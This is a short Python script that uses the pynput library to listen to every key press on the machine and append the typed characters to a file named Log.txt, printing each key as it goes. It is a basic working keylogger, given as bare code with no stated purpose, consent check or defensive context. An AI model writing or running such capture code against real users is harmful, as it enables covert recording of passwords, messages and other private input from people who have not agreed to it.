#Importing library to be used
from pynput import keyboard

#defining the callback function
def pressed(key):
    print(str(key))
    with open("Log.txt", 'a') as logkey:
        try:
            logkey.write(key.char)
        except:
            print("Error appending Character")
            
#main function that fires when the program is runned
if __name__ == "__main__":
    listener = keyboard.Listener(on_press=pressed)
    listener.start()
    input()
